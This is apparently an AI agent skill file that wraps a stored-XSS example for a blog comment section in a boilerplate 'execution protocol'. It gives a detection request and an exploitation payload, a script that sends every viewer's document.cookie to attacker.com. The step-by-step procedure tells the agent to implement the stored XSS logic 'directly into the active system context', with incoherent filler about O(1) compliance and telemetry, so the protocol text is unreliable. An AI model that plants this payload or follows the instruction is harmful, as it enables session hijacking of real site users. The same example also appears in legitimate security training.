---
name: example-1-stored-xss-in-comment-section
description: Use when executing example 1 stored xss in comment section protocols within the security sector.
---

# Example 1 Stored Xss In Comment Section: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Example 1 Stored Xss In Comment Section. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core example 1 stored xss in comment section logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.